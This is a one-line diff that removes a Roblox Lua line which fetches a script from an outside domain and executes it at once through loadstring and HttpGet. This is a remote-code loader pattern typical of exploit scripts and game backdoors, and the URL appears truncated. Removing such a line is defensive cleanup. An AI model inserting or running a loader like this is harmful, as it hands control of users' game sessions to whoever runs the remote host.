@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://jx.jedpep.xyz/script.'))()
